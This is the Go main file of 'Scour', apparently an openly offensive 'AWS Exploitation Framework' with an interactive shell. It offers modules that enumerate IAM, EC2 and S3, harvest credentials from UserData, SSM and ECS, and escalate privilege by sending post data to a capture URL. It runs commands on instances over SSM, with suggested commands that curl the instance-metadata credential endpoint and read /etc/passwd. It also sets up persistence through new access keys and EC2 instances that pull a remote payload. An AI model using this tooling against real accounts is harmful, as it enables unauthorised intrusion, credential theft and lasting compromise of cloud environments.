package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/url"
	"os"
	"os/user"
	"regexp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/credentials/stscreds"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/iam"
	"github.com/chzyer/readline"
	"github.com/gookit/color"
	"github.com/grines/scour/pkg/awsdata"
)

var sess *session.Session
var region string
var connected bool
var target string

type awsToken struct {
	Code            string    `json:"Code"`
	LastUpdated     time.Time `json:"LastUpdated"`
	Type            string    `json:"Type"`
	AccessKeyID     string    `json:"AccessKeyId"`
	SecretAccessKey string    `json:"SecretAccessKey"`
	Token           string    `json:"Token"`
	Expiration      time.Time `json:"Expiration"`
}

func main() {
	tid := awsdata.SetTracking()
	start(tid)
}

func start(t string) {

	red := color.FgRed.Render
	blue := color.FgBlue.Render
	green := color.FgGreen.Render
	fmt.Println("\nUA Tracking Session: exec-env/" + t + "\n")
	ascii := `AWS Exploitation Framework
 _____  _____ ____  _    _ _____  
/  ___|/ ____/ __ \| |  | |  __ \ 
| (___| |   | |  | | |  | | |__)|
\___ \| |   | |  | | |  | |  _  / 
____) | |___| |__| | |__| | | \ \ 
|____/ \_____\____/ \____/|_|  \_\ by grines
`
	print(ascii + "\n")

	for {
		var completer = readline.NewPrefixCompleter(
			readline.PcItem("profile",
				readline.PcItemDynamic(listProfiles(),
					readline.PcItem("us-east-1"),
					readline.PcItem("us-east-2"),
					readline.PcItem("us-west-1"),
					readline.PcItem("us-west-2"),
				),
			),
			readline.PcItem("assume-role",
				readline.PcItemDynamic(listRoles(sess),
					readline.PcItem("us-east-1"),
					readline.PcItem("us-east-2"),
					readline.PcItem("us-west-1"),
					readline.PcItem("us-west-2"),
				),
			),
			readline.PcItem("assume-raw",
				readline.PcItem("us-east-1"),
				readline.PcItem("us-east-2"),
				readline.PcItem("us-west-1"),
				readline.PcItem("us-west-2"),
			),
			readline.PcItem("enum",
				readline.PcItem("IAM"),
				readline.PcItem("EC2"),
				readline.PcItem("S3"),
				readline.PcItem("Network"),
			),
			readline.PcItem("privesc",
				readline.PcItem("UserData",
					readline.PcItemDynamic(listEc2(sess),
						readline.PcItem("http://url.to.capture.post.data"),
					),
				),
				readline.PcItem("IAM"),
			),
			readline.PcItem("creds",
				readline.PcItem("UserData"),
				readline.PcItem("SSM"),
				readline.PcItem("Lambda"),
				readline.PcItem("ECS"),
			),
			readline.PcItem("execute",
				readline.PcItem("ssm-command",
					readline.PcItemDynamic(listEc2(sess),
						readline.PcItem("\"curl http://169.254.169.254/latest/meta-data/iam/security-credentials\""),
						readline.PcItem("\"cat /etc/passwd\""),
					),
				),
				readline.PcItem("UserData",
					readline.PcItemDynamic(listEc2(sess),
						readline.PcItem("\"curl http://169.254.169.254/latest/meta-data/iam/security-credentials\""),
						readline.PcItem("\"cat /etc/passwd\""),
					),
				),
			),
			readline.PcItem("persist",
				readline.PcItem("AccessKey",
					readline.PcItemDynamic(listUsers(sess)),
				),
				readline.PcItem("EC2",
					readline.PcItem("ami-013f17f36f8b1fefb",
						readline.PcItem("https://url.to.compiled.payload/payload"),
					),
				),
				readline.PcItem("SSM",
					readline.PcItemDynamic(listEc2(sess)),
				),
			),
			readline.PcItem("whoami"),
			readline.PcItem("list",
				readline.PcItem("users"),
				readline.PcItem("groups"),
				readline.PcItem("groupsForUser",
					readline.PcItemDynamic(listUsers(sess)),
				),
				readline.PcItem("roles"),
				readline.PcItem("ssm-parameters"),
			),
			readline.PcItem("get",
				readline.PcItem("user",
					readline.PcItemDynamic(listUsers(sess)),
				),
				readline.PcItem("group"),
				readline.PcItem("role"),
				readline.PcItem("s3-policy",
					readline.PcItemDynamic(listBuckets(sess)),
				),
				readline.PcItem("s3-acl",
					readline.PcItemDynamic(listBuckets(sess)),
				),
			),
		)
		l, err := readline.NewEx(&readline.Config{
			Prompt:          "\033[31m»\033[0m ",
			HistoryFile:     "/tmp/readline.tmp",
			AutoComplete:    completer,
			InterruptPrompt: "^C",
			EOFPrompt:       "exit",

			HistorySearchFold:   true,
			FuncFilterInputRune: filterInput,
		})
		if err != nil {
			panic(err)
		}
		defer l.Close()

		log.SetOutput(l.Stderr())
		if target == "" || connected == false {
			l.SetPrompt(red("Not Connected") + " <" + blue("") + "> ")
		} else {
			l.SetPrompt(green("Connected") + " <" + blue(target) + "> ")
		}
		line, err := l.Readline()
		if err == readline.ErrInterrupt {
			if len(line) == 0 {
				break
			} else {
				continue
			}
		} else if err == io.EOF {
			break
		}

		line = strings.TrimSpace(line)
		switch {

		//Load aws profile from .aws/credentials
		case strings.HasPrefix(line, "profile "):
			parts := strings.Split(line, " ")
			if len(parts) != 3 || strings.Contains(line, "help") {
				fmt.Println("Required: profile profilename region")
				break
			}
			target = parts[1]
			region = parts[2]
			sess = getProfile(target, region)
		case strings.HasPrefix(line, "assume-role") && connected == true:
			parts := strings.Split(line, " ")
			if len(parts) != 3 || strings.Contains(line, "help") {
				fmt.Println("Required: assume-role role-arn region")
				break
			}
			arn := parts[1]
			region = parts[2]
			sess = assumeRole(arn, region)
			target = arn
		case strings.HasPrefix(line, "assume-raw"):
			s := line
			r := regexp.MustCompile(`[^\s"']+|"([^"]*)"|'([^']*)`)
			parts := r.FindAllStringSubmatch(s, -1)
			region = parts[1][0]
			json := parts[2][2]
			sess = assumeRaw(region, json)

		//The whoami/whoareyou
		case strings.HasPrefix(line, "whoami") && connected == true:
			awsdata.Whoami(sess)
		case strings.HasPrefix(line, "get user ") && connected == true:
			parts := strings.Split(line, " ")
			if len(parts) != 3 || strings.Contains(line, "help") {
				fmt.Println("Required: get user username")
				break
			}
			username := parts[2]
			awsdata.GetUser(sess, username)
		case strings.HasPrefix(line, "get instance-profile ") && connected == true:
			parts := strings.Split(line, " ")
			profile := parts[2]
			//awsdata.GetInstanceProfile(sess, profile)
			status := awsdata.AnalyzeInstanceProfile(sess, profile)
			fmt.Printf("Privileged: %v\n", status)
		case strings.HasPrefix(line, "get policy ") && connected == true:
			parts := strings.Split(line, " ")
			arn := parts[2]
			json := awsdata.GetPolicyVersion(sess, arn)
			status := awsdata.AnalyzePolicy(json)
			fmt.Printf("Privileged: %v\n", status)
		case strings.HasPrefix(line, "get s3-policy ") && connected == true:
			parts := strings.Split(line, " ")
			bucket := parts[2]
			policy := awsdata.GetBucketPolicy(sess, bucket)
			if policy != nil {
				decodedValue, _ := url.QueryUnescape(aws.StringValue(policy.Policy))

				var prettyJSON bytes.Buffer
				error := json.Indent(&prettyJSON, []byte(decodedValue), "", "\t")
				if error != nil {
					log.Println("JSON parse error: ", error)
					return
				}

				fmt.Println(string(prettyJSON.Bytes()))
			}
		case strings.HasPrefix(line, "get s3-acl ") && connected == true:
			parts := strings.Split(line, " ")
			bucket := parts[2]
			policy := awsdata.GetBucketACL(sess, bucket)
			if policy != nil {
				fmt.Println(policy)
			}
		case strings.HasPrefix(line, "get user-policy ") && connected == true:
			parts := strings.Split(line, " ")
			user := parts[2]
			policy := parts[3]
			json := awsdata.GetUserPolicy(sess, user, policy)
			status := awsdata.AnalyzePolicy(json)
			fmt.Printf("Privileged: %v\n", status)
		case strings.HasPrefix(line, "analyzer roles") && connected == true:
			awsdata.AnalyzeRoleTrustRelationships(sess)

		//Execution of commands
		case strings.HasPrefix(line, "execute ssm-command") && connected == true:
			s := line
			r := regexp.MustCompile(`[^\s"']+|"([^"]*)"|'([^']*)`)
			parts := r.FindAllString(s, -1)
			if len(parts) != 4 || strings.Contains(line, "help") {
				fmt.Println("Example: execute ssm-comand i-i00000000 \"cat /etc/passwd\"")
				fmt.Println("Execution module will run the supplied command on the given instance using SSM command execution.")
				break
			}
			instance := parts[2]
			cmd := parts[3]
			cmdid := awsdata.SendCommand(sess, instance, cmd)
			if cmdid != "" {
				time.Sleep(5 * time.Second)
				awsdata.GetCommandInvocation(sess, instance, cmdid)
			}

		//Persistence operations
		case strings.HasPrefix(line, "persist AccessKey") && connected == true:
			parts := strings.Split(line, " ")
			if len(parts) != 3 || strings.Contains(line, "help") {
				fmt.Println("Required: persist Accesskey username")
				break
			}
			username := parts[2]
			awsdata.PersistAccessKey(sess, username)
		case strings.HasPrefix(line, "persist EC2") && connected == true:
			parts := strings.Split(line, " ")
			payloadurl := parts[3]
			ami := parts[2]
			awsdata.PersistEC2(sess, ami, payloadurl)
		case strings.HasPrefix(line, "persist SSM") && connected == true:
			parts := strings.Split(line, " ")
			ami := parts[2]
			awsdata.PersistSSM(sess, ami)

		//Privesc Operations
		case strings.HasPrefix(line, "privesc UserData") && connected == true:
			parts := strings.Split(line, " ")
			payload := parts[2]
			instance := parts[3]
			awsdata.PrivescUserdata(sess, payload, instance)

		//List operations
		case strings.HasPrefix(line, "list ssm-parameters") && connected == true:
			awsdata.DescribeParameters(sess)
		case strings.HasPrefix(line, "list users") && connected == true:
			awsdata.ListUsers(sess, false)
		case strings.HasPrefix(line, "list buckets") && connected == true:
			awsdata.ListBuckets(sess, false)
		case strings.HasPrefix(line, "list groups") && connected == true:
			awsdata.ListGroups(sess)
		case strings.HasPrefix(line, "list ecs-task-definitions") && connected == true:
			awsdata.ListTaskDefinitions(sess)
		case strings.HasPrefix(line, "list groupsForUser ") && connected == true:
			parts := strings.Split(line, " ")
			username := parts[2]
			awsdata.ListGroupsForUser(sess, username)
		case strings.HasPrefix(line, "list roles") && connected == true:
			awsdata.ListRoles(sess)

		//Enumeration
		case strings.HasPrefix(line, "enum IAM") && connected == true:
			awsdata.IamEnumerate(sess, t)
			os.Setenv("AWS_EXECUTION_ENV", t)
		case strings.HasPrefix(line, "enum EC2") && connected == true:
			awsdata.EnumEC2(sess, t)
			os.Setenv("AWS_EXECUTION_ENV", t)
		case strings.HasPrefix(line, "enum S3") && connected == true:
			awsdata.EnumS3(sess)

		//Credential Discovery
		case strings.HasPrefix(line, "creds UserData") && connected == true:
			awsdata.CredentialDiscoveryUserData(sess, t)
			os.Setenv("AWS_EXECUTION_ENV", t)
		case strings.HasPrefix(line, "creds SSM") && connected == true:
			awsdata.CredentialDiscoverySSMParams(sess, t)
			os.Setenv("AWS_EXECUTION_ENV", t)
		case strings.HasPrefix(line, "creds ECS") && connected == true:
			awsdata.CredentialDiscoveryECSEnv(sess, t)
			os.Setenv("AWS_EXECUTION_ENV", t)

		//Show command history
		case line == "history":
			dat, err := ioutil.ReadFile("/tmp/readline.tmp")
			if err != nil {
				break
			}
			fmt.Print(string(dat))

		//exit
		case line == "bye":
			goto exit

		//Default if no case
		default:
			cmdString := line
			if connected == false {
				fmt.Println("You are not connected to a profile.")
			}
			if cmdString == "exit" {
				os.Exit(1)
			}
		}
	}
exit:
}

//Filter input from readline CtrlZ
func filterInput(r rune) (rune, bool) {
	switch r {
	// block CtrlZ feature
	case readline.CharCtrlZ:
		return r, false
	}
	return r, true
}

//Load profile from .aws/credentials by name
func getProfile(pname string, region string) *session.Session {
	sess, err := session.NewSession(&aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewSharedCredentials("", pname),
	})
	if err != nil {
		fmt.Println("Invalid Credentials")
		connected = false
	} else {
		connected = true
	}
	_, err = sess.Config.Credentials.Get()
	if err != nil {
		fmt.Println("Invalid Credentials")
		connected = false
	} else {
		connected = true
	}
	return sess
}

//Load profile from .aws/credentials by name
func assumeRole(arn string, region string) *session.Session {
	creds := stscreds.NewCredentials(sess, arn)
	sess, err := session.NewSession(&aws.Config{
		Region:      aws.String(region),
		Credentials: creds,
	})
	if err != nil {
		fmt.Println(err)
		connected = false
	} else {
		connected = true
	}
	_, err = sess.Config.Credentials.Get()
	if err != nil {
		fmt.Println(err)
		connected = false
	} else {
		connected = true
	}
	return sess
}

func assumeRaw(region string, data string) *session.Session {
	var token awsToken
	err := json.Unmarshal([]byte(data), &token)

	sess, err := session.NewSession(&aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewStaticCredentials(token.AccessKeyID, token.SecretAccessKey, token.Token),
	})
	if err != nil {
		fmt.Println(err)
		connected = false
	} else {
		connected = true
	}
	_, err = sess.Config.Credentials.Get()
	if err != nil {
		fmt.Println(err)
		connected = false
	} else {
		connected = true
		target = token.AccessKeyID
	}
	return sess
}

func listProfiles() func(string) []string {
	return func(line string) []string {
		rule := `\[(.*)\]`
		var profiles []string

		usr, err := user.Current()
		if err != nil {
			log.Fatal(err)
		}

		dat, err := ioutil.ReadFile(usr.HomeDir + "/.aws/credentials")
		if err != nil {
			fmt.Println(err)
		}

		r, _ := regexp.Compile(rule)
		if r.MatchString(string(dat)) {
			matches := r.FindAllStringSubmatch(string(dat), -1)
			for _, v := range matches {
				profiles = append(profiles, v[1])
			}
		}
		return profiles

		//var a = []string{""}
		//return a

	}
}

func listUsers(sess *session.Session) func(string) []string {
	return func(line string) []string {
		users := awsdata.ListUsers(sess, true)
		return users

	}
}

func listEc2(sess *session.Session) func(string) []string {
	return func(line string) []string {
		var results []string
		instances := awsdata.DescribeInstances(sess)
		for _, v := range instances {
			for _, i := range v.Instances {
				results = append(results, *i.InstanceId)
			}
		}

		return results
	}
}

func listRoles(sess *session.Session) func(string) []string {
	return func(line string) []string {
		var results []string
		svc := iam.New(sess)

		result, err := svc.ListRoles(&iam.ListRolesInput{
			MaxItems: aws.Int64(100),
		})

		if err != nil {
			fmt.Println("Error", err)
			return nil
		}

		for _, role := range result.Roles {
			if role == nil {
				continue
			}
			results = append(results, *role.Arn)
		}
		return results
	}
}

func listBuckets(sess *session.Session) func(string) []string {
	return func(line string) []string {
		var results []string

		buckets := awsdata.ListBuckets(sess, true)

		for _, b := range buckets {
			results = append(results, b)
		}
		return results
	}
}
